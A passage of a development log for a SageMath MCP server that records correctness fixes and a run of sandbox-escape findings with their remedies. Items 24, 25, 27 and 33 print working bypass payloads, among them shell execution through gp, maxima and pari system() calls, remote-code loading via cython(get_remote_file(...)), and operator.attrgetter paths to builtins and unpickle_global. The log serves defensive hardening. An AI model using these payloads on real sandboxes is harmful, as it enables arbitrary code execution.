computation", which is both safe and true. Covered from both directions: idle
returns False and the session stays usable; a real in-flight computation is
signalled, returns `Interrupted`, and its variables survive.

---

## 20. Large integer results are silently corrupted in JS clients — high — DONE

Found by the extended CLI suite, which had never been run against the split
branch and is not run by CI. Claude answered `bell(30)` as
`846749014511809388871680`; the correct value is `846749014511809332450147`.

### What was wrong

Item 12 fixed integers coming *in*: above 2^53 a JSON number is no longer exact,
so those parameters must arrive as decimal strings. Results going *out* were
still emitted as JSON numbers, and a JavaScript-based MCP client parses every
number as an IEEE double. The server sent the exact value and the client rounded
it. Nothing errored, and the wrong number was displayed as the answer -- the
worst way for this to fail, because there is nothing for a caller to notice.

Confirmed server-side: the tool returned `846749014511809332450147`, and
`int(float(...))` of that is `846749014511809388871680`.

### Fix

`_exactify_large_ints` renders any integer beyond 2^53 as a decimal string, and
recurses into lists and dicts so factorisations, bases and varieties are covered
too. Applied at the single point where every specialized tool returns its result
(`_evaluate_structured`), so no tool can miss it. Integers below the boundary
keep their numeric type, so ordinary results are unchanged. `bool` is excluded --
it is an `int` subclass and would otherwise become `"True"`.

This is a **user-visible output contract change**, documented in the README and
the changelog. It mirrors the input side, which has spoken decimal strings for
the same values since 0.4.0.

### Verification

Unit tests for the helper including the container and type-preservation cases,
the item-12 test updated to assert the string, and four values checked against
real SageMath and round-tripped through JSON: `bell(30)`, `factorial(25)`,
`next_prime(10^30)` exact; `binomial(10,3)` still the integer `120`. The CLI case
that found it now passes.

---

## 21-23. Findings from the persistence/availability review — DONE

Seven findings, four rated P1. Each was reproduced before being fixed.

**21. Journal replay could not restore specialized-tool state.** Helper tools run
with `trusted=True` because their templates are built on `sage_eval`, but the
journal stored bare code and replay always used the caller policy. The first
specialized entry was rejected, replay stopped there, and the next save wrote
back only the replayed prefix -- persisted state quietly truncated and
unrestorable. Entries now record the trust mode they ran under and replay under
it; blessing every entry would have put caller code on the trusted path, which is
the one thing the policy split exists to prevent. Journals written before this
are plain strings and read as untrusted, which is both the safe reading and the
accurate one.

**22a. Exact-integer inputs.** `combinatorics_operation` (`n`, `k`) and
`elliptic_curve_operation` (`coefficients`) never called `_exact_int`, so
`binomial(9007199254740993, 2)` computed a plausible wrong answer from the
rounded value. Both now accept decimal strings and refuse numbers past 2^53, as
`number_theory_operation` has since 0.4.0.

**22b. `/health` was never registered.** The old code hunted for a Starlette app
on the FastMCP object and inserted a `Route`; under FastMCP 3.x `http_app` is a
bound method that *builds* the app, so the guard never matched -- inside a bare
`except: pass`, so it failed in silence while the README advertised the endpoint
and the Helm chart probed it. Now registered via `custom_route`, idempotently,
and asserted against the app FastMCP actually builds. The previous test passed
because it asserted against a mock with a `.routes` list.

**22c. `is_convex` returned true for concave input.** `Polyhedron(vertices=...)`
builds the convex hull, discarding the ordering that makes a polygon concave, and
`is_compact()` is true for every bounded polytope. It now walks the given
ordering and checks that every turn goes the same way.

**23a. The nightly handed all three provider keys to each leg.** A compromised
CLI -- or any npm dependency of one -- could read credentials for services it has
no business touching. Each leg now sees only its own.

**23b. The nightly stayed green when registration failed.** `run_extended`
catches the `CalledProcessError` from `mcp add`, so a changed CLI syntax printed
"0/0 passed" and exited 0: green precisely when the CLI could not reach the
server. A selected CLI that runs no cases now fails. Absent credentials remain a
skip, not a failure -- those legs never start the runner.

**Also, an unbounded queue.** The stdout pump gives the read loop no backpressure
by design, so output produced faster than a slow callback consumed it grew
without limit until the process died. Bounded at 1000 lines, dropping oldest;
the complete stdout still travels with the result, so nothing is lost that a
caller cannot recover.

---

## 24. Forbidden functions reachable through attribute chains — **critical** — DONE

The name rules inspected bare `ast.Name` nodes and `ast.Call.func`. `sage` is an
allowed import root and none of its segments are forbidden, so the same function
sat one dot further along:

    sage.misc.sage_eval.sage_eval("__import__('os').getuid()")   -> 1001
    sage.all.sage_eval("__import__('os').getuid()")              -> 1001

Item 18 again, by a different path: the payload is a string the validator never
parses. What is checked now is the final name, however it is spelled.

`load()` and `attach()` were on no list at all. They execute whatever path they
are given and `load()` accepts a URL, which makes that remote code execution from
an ordinary-looking name. Both are forbidden for callers; no generated template
uses either.

## 25. Sage's helpers and CAS interfaces execute code — **critical** — DONE

Found by pulling on the previous thread, and worse than it.

    cython(get_remote_file('https://.../payload.pyx'))   download, compile, run
    sh('id')                                             a shell
    gp('system("id > /tmp/x")')                          wrote the file
    maxima('system("id > /tmp/x")')                      wrote the file

The last two are arbitrary shell execution: both landed real files owned by the
container user. Sage's interfaces spawn the actual CAS programs, and those carry
their own `system()` escapes.

**Why the earlier fixes kept missing it.** Each was another name added to a
denylist covering a namespace 1,838 entries deep. That does not converge. The
worker now removes names by **provenance**: fifteen modules that compile, run
shells, download, pickle or touch arbitrary paths, plus everything
`sage.interfaces.all` exports -- Sage's own list, so an interface added by a
future release is covered without anyone remembering. 169 names.

The mathematics is untouched, which was the thing to verify: Gröbner bases,
factoring, number fields, permutation groups, elliptic-curve rank, integration,
solving and plotting all still work, because Sage reaches Singular and PARI
in-process and only the subprocess interfaces were removed.

**A regression I caused fixing it.** The first version read `__module__` off every
namespace entry, which resolves every lazy import: startup went from instant to
1.8s, the delay landed inside the caller's first evaluation, and two timeout
tests failed on CI. The names are a literal now, with a test that re-derives them
from the installed Sage so a version bump cannot silently reopen the hole.

**Standing caveat.** This is the fourth bypass class in a day. The specific holes
are closed and tested, but a denylist over a CAS namespace is structurally on the
back foot -- the container remains the boundary, as §3 says. An allowlist for
caller code is the durable answer if it is ever worth the investment.

## 26. Supply chain and exposure — medium — DONE

`uv lock --check` was failing: the lock still said 0.4.0 after the 0.5.0 release,
because the bump script never touched it. No vulnerable dependency -- pip-audit
against the locked set reports nothing known -- but CI installs with `uv pip
install -e .[dev]`, which ignores the lock, so the audit and the set a consumer
gets by `uv sync` were different things and neither the drift nor the lock was
checked anywhere. The bump script re-locks now, CI runs `uv lock --check`, and
the version-consistency test includes the lock so it fails offline in a
millisecond.

`docker-compose` published `8314:8314`, binding every interface. Local MCP servers
are unauthenticated by design and that is fine; what stood out is that every
other default here is loopback -- stdio transport, `--host 127.0.0.1`,
`ClusterIP` -- so the quickstart was the one place that disagreed. It publishes to
`127.0.0.1:8314`, with a test that fails if it widens.

---

## 27. Imports re-create everything the scrub removed — **critical** — DONE

The namespace scrub (item 25) takes the dangerous helpers out of the worker
namespace. A caller who imports the module gets a fresh copy, and `sage.*` was on
the import allowlist. Measured against real SageMath:

    from sage.misc.cython import compile_and_load as f
    f('print(1)')                                   compiled and loaded a module

    from sage.interfaces.gp import Gp as P
    P()('2+2')                                      spawned GP -> 4

    from sage.misc.persist import unpickle_global as f
    f('os', 'system')('id')                         ran a shell command -> 0

Aliasing hid the names from every later rule, so the gate has to be the import
itself. **Caller code can no longer import anything.** The allowlist was there for
the generated prelude (`from sage.all import *`) and the plot templates (`base64`,
`io`); it now belongs to `trusted_policy()` alone. Callers never needed it -- the
worker starts with Sage fully loaded, which is how every documented example is
written.

Sage's own sub-packages (`cython`, `persist`, `remote_file`, `interfaces`,
`repl`, …) also joined the forbidden attribute roots, because `sage` is bound in
the namespace and `sage.misc.persist.unpickle_global` needed no import at all.

**Contract change:** `import math` and `from sage.all import factorial` used to be
accepted from callers. They are not. The names are already there without them.

## 28. Object methods write arbitrary files — high — DONE

`.save()` was forbidden; `.dump()`, `.save_image()` and `.export_jmol()` were not,
and each wrote a real file. Chasing them one name at a time is the same losing
game as the namespace denylist, so persistence is matched by **prefix** --
`save*`, `dump*`, `export*` -- for caller code.

`trusted_policy()` clears that rule, because the plot templates render through
`.savefig(BytesIO)`. A blanket prefix rule would have taken all three plotting
tools with it, which is why the exemption is deliberate rather than incidental.

Worth keeping in proportion: under the shipped container these writes land in a
512 MB tmpfs on a read-only root filesystem, and `/workspace` is mounted
read-only. The boundary held. The capability was still unintended.

## 29. A timeout escaped as a bare TimeoutError — medium — DONE

`evaluate_sage` handled `CancelledError`, `SageEvaluationError` and
`SageProcessError`, but not `TimeoutError`: a timed-out evaluation propagated raw,
so monitoring recorded nothing and the client got an unstructured error instead of
the message.

It went unnoticed because the test covering it ran `import time; time.sleep(10)`.
Once callers lost imports that became a `SecurityViolation` -- also a `ToolError`,
so the test kept passing while testing nothing. Both paths now translate the
timeout, record the message (not the class name, which tells an operator nothing)
and the test uses a long pure-Sage computation.

## 30. A binding could authorize a name the allowlist withholds — medium — DONE

The allowlist trusts two things: names it lists, and names the caller's own code
binds. The second is deliberately an over-approximation — `_bound_names` collects
static targets and never asks whether the assignment runs, because short of
executing the code it cannot. So `if False: __builtins__ = 1` authorizes
`__builtins__`, and `except ValueError as __builtins__` does it without the code
ever naming the object.

That only matters for names live in the worker namespace but absent from the
allowlist. There are nine, all dunders — `__builtins__`, `__import__`,
`__build_class__`, `__loader__` and friends — and `__builtins__['__import__']
('os')` is a shell. Probed end to end against Sage 10.9: every route was refused,
because reading a dunder is blocked by its own rule regardless of what authorized
the name.

So it was defence in depth, not a hole. Fixed anyway, on both sides:

- `_bound_names` drops dunders, so a binding cannot authorize what a caller may
  not read. The allowlist stops resting on a rule enforced elsewhere.
- The drift test asserted `additions` over names filtered by `startswith("_")`,
  which is exactly why the gap was invisible. It now asserts the *shape* of the
  gap — everything live-but-not-allowlisted must be a dunder — so a future Sage
  putting an ordinary name there fails the test instead of quietly widening what
  a binding can reach.

Two things found while probing, both left as they are:

- `except ValueError as srange:` deletes `srange` at the end of the block, per
  Python's own semantics, so a preloaded Sage function is gone for the rest of
  that session. Self-inflicted, session-scoped, and no different in kind from
  `srange = 5` shadowing it.
- The committed allowlist still listed the twelve names from the modules added to
  `_DANGEROUS_SAGE_MODULES` (`lazy_import`, `save_session`, …) because it predated
  that change. Unreachable either way — they are scrubbed from the namespace and
  refused by name — but stale. `make allowlist` now regenerates through a temp
  file, and regeneration is idempotent.

## 31. Nothing tested that mathematics still works — medium — DONE

The allowlist inverted the default, and with it the failure mode. The security
suite could not catch the new one: every test in it asserts something is
*blocked*, so a policy that refused everything would pass all of them. Three
real regressions were already shipped and invisible.

`tests/test_math_coverage.py` covers the other direction in three layers, two of
which need no Sage and run in the fast job, because that is where allowlist
regressions come from:

- **Binding forms** (35 cases) — every way Python and Sage create a name, since
  a caller's own names bypass the allowlist and anything `_bound_names` misses
  becomes an unusable variable.
- **A mathematical corpus** (59 cases) — one per area this server advertises,
  asserted to evaluate at all, so a whole area going dark cannot pass unnoticed.
- **Allowlist reachability** — the names callers actually reach for, named by
  area so a failure says which area broke rather than "1 of 1913 missing", plus
  a size floor because a nearly-empty allowlist passes every security test.

Found and fixed:

- **`match` statements bound nothing.** Patterns bind through `MatchAs`,
  `MatchStar` and `MatchMapping.rest`, not `Name` nodes, so every variable in a
  match statement read as undefined for the rest of the session.
- **`function('f')` bound nothing.** Sage's spelling for declaring a symbolic
  function injects into the namespace exactly as `var()` does — verified against
  10.9 — but only `var` was special-cased. `f = function('f')` worked, the bare
  form did not, and the bare form is what the documentation shows.
- **The refusal message sent callers after a fix they cannot perform.** `y` is
  not predefined, in this server or in Sage itself, so `diff(x^2*y^3, x, y)` is
  ordinary mathematics that needs `var('y')`. Being told the name "needs to be
  added to the allowlist" is true and useless. Clients are models that retry on
  the message they are given; short lowercase names now get told to declare the
  symbol, longer ones still get the allowlist message.

The suite was then deepened, because "it evaluated without raising" is a weak
assertion -- this project has already shipped a silently wrong answer (integers
above 2^53 corrupted by JSON parsing) that every no-exception test passed. Three
layers were added:

- **Mathematical truths** (72 predicates Sage evaluates to `True`) replaced the
  no-exception corpus. Sage decides equality, so there are no brittle string
  comparisons: `expand((x^2-1).factor()) == x^2-1` and `M * M.inverse() ==
  identity_matrix(2)` are invariants, not printed output. `==` on symbolics
  builds an *equation* rather than deciding one, so the harness wraps the final
  line in `bool()`.
- **Equivalent spellings** (19 groups) assert agreement *between* spellings —
  `2^10`, `2**10`, `pow(2, 10)` — which catches a wrong answer without anyone
  having to know the right one in advance.
- **Preparser forms** (17) pin the ways Sage is not Python: `5/2` exact, `2^10`
  a power, `R.<t> = QQ[]` a generator declaration.

Two more real fixes came out of it, and one upstream limitation:

- **Uniformly indented code was refused.** A snippet lifted out of a markdown
  block arrives with four spaces on every line, and got a syntax error for its
  margin rather than its mathematics. `normalize_caller_code()` dedents before
  validation *and* before execution, so both see the same text. It cannot change
  a valid program: valid module-level code has no common indent to remove.
- **Layer 2 (bindings across calls)** was split, because `_bound_names`
  over-approximates by design and comprehension targets and function arguments
  are *supposed* to vanish. A caller reading one now provably gets Python's own
  NameError rather than a security refusal — the difference between "you made a
  mistake" and "the server withheld something", and the second sends them
  hunting a permission problem that does not exist.
- **`match` with numeric literal patterns is broken by SageMath itself.** The
  preparser rewrites `case 1:` to `case _sage_const_1:`, which Python reads as a
  name capture: "makes remaining patterns unreachable". Verified against plain
  `sage script.sage` on 10.9 — inherited, not introduced, and nothing to fix
  here. The test cases use patterns that survive the preparser.

Two probe results worth keeping: `y`/`z`/`t` are genuinely not predefined in
Sage either, so refusing them is correct rather than a regression — but the
*tool* prelude declares `x, y, z, t`, so `differentiate_expression("x^2*y^3")`
works where the equivalent `evaluate_sage` call does not. That inconsistency is
recorded, not fixed: closing it means either predefining three symbols the Sage
REPL does not, or making the tools stricter than they have been.

## 33. String-path attribute access defeated every attribute rule — critical — DONE

Codex asked whether a dead assignment could authorize a worker-global the
allowlist excluded. That specific path was already closed — the gap contains
only dunders, and there is a test asserting it — but the search list attached to
the question (`attrgetter|methodcaller|itemgetter|partial|reduce|operator`)
pointed at something worse, and it was live.

**Every attribute rule this server has is enforced on the AST**: the parent and
the attribute are both read out of the source. `operator.attrgetter` takes its
path as a *runtime string*, so none of that machinery applies. Sage binds 22
module objects including `sage` itself, so one string-path primitive reaches the
whole tree. Confirmed against 10.9, each of these ran:

| Payload | Result |
|---|---|
| `pari('system("id > /tmp/x")')` | **shell command executed**, file written |
| `operator.attrgetter("misc.persist.unpickle_global")(sage)` | returned the real function — arbitrary code execution |
| `operator.attrgetter("__builtins__")(warnings)` | the real builtins dict, and from there `__import__` |
| `operator.attrgetter("__class__.__base__.__subclasses__")(1)()` | the classic escape, invisible to the dunder rule |
| `operator.methodcaller("save", "/tmp/x")(matrix(...))` | **file written**, defeating the `save*` prefix rule |
| `oeis(45)` | network request from a sandbox with no network need |

Root cause is structural, and it is the same one as before: the allowlist is
generated as *whatever survives the namespace scrub*, so it inherits every gap
in that scrub. `operator` and `warnings` are stdlib modules with no Sage
provenance; `pari` is the PARI **library** interface, which the external-CAS
scrub missed because it comes from `sage.libs.pari` rather than
`sage.interfaces.all`.

Fixed on both sides. `attrgetter`, `methodcaller` and `itemgetter` are forbidden
call names, and `operator`, `warnings`, `pari` and `oeis` are forbidden
attribute parents, so the refusal happens before anything runs. The namespace
scrub drops those four plus the display and IO helpers that each demonstrated a
concrete capability — `install_doc`, `show`, `view`, `animate`, `html`, `latex`,
`search_src`, `search_doc`, `reference`, `Profiler`. The allowlist regenerated to
exactly −14 names, nothing else.

Worth being precise about why removing `operator` is the load-bearing part
rather than removing modules: **any** module object yields `__builtins__` through
a string path, so chasing modules one at a time was never going to work.
`getattr`, `setattr` and `vars` were already refused, which is what left
`operator` as the only remaining way in — verified by probing each primitive
individually rather than assumed.

Two things checked before trusting the removals: `latex` is imported from
`sage.all` inside `_latex()` rather than read from the caller namespace, so
LaTeX output is unaffected, and the plot tools render through
`.savefig(BytesIO)` rather than `show`. Both confirmed by the full suite — 763
tests against real Sage.

The undeclared-symbol heuristic was tightened in the same change: "short and
lowercase" also matched `pari`, `oeis` and `show`, so the server was advising
`var('pari')` for a name it had deliberately withheld. A symbol is now a single
letter with an optional index, or one of the Greek names Sage binds.

**These vectors exist in the released 0.5.0.** A 0.5.1 is not optional.

## 34. A dangerous-module entry that protected nothing — medium — DONE

Follow-up on item 33, from checking my own fix rather than a new report. The
`sage.libs.pari.all` entry added to `_DANGEROUS_SAGE_MODULES` removed **zero
names**. The derived set stayed at 198, identical to the baked list.

`_dangerous_sage_names` takes only names *defined* in a listed module -- it has
to, since `sage.misc.persist` also has `Integer` in scope and removing that
would break the mathematics -- and `pari`, `pari_gen` and `PariError` are every
one of them defined in `cypari2`. So the entry read like protection and was
none. What actually removed `pari` was the explicit `_DANGEROUS_BARE_NAMES`
entry, which is why the vector tested as closed.

This is the failure mode the repository keeps meeting: a check that silently
covers nothing while looking like it covers something. Fixed the same way as
the generated-code lint's discovery floor -- an integration test now fails on
any provenance entry that matches no names, so a dead entry cannot be added
silently again. `pari` moved to the bare-name list with the reasoning written
down beside it.

Two things checked while there, both clean:

- **`pari_gen` and `PariError` are still live and are inert.** `pari_gen()`
  refuses to instantiate ("PARI objects cannot be instantiated directly"),
  `.eval` is a forbidden function, and `__pari__` is a blocked dunder, so there
  is no route from a Sage object back to a PARI evaluator.
- **`SAGEMATH_MCP_STARTUP` cannot smuggle a name to callers.** A custom startup
  does bind whatever it likes in the namespace -- `import os as helper` works --
  but the allowlist is baked from the default namespace, so `helper` is refused
  as "not a name this server offers". It is operator-controlled configuration
  in any case, and anyone who can set it already owns the process. Worth
  recording as a property the allowlist now provides for free: before it, a
  custom startup was reachable by caller code.

SSH authentication to GitHub broke during this session (`ssh -T git@github.com`
returns `Permission denied (publickey)` with keys loaded). `gh` still works
because it uses token auth. If it persists, `git remote set-url origin https://…`
with `gh auth setup-git` routes git through the same token.
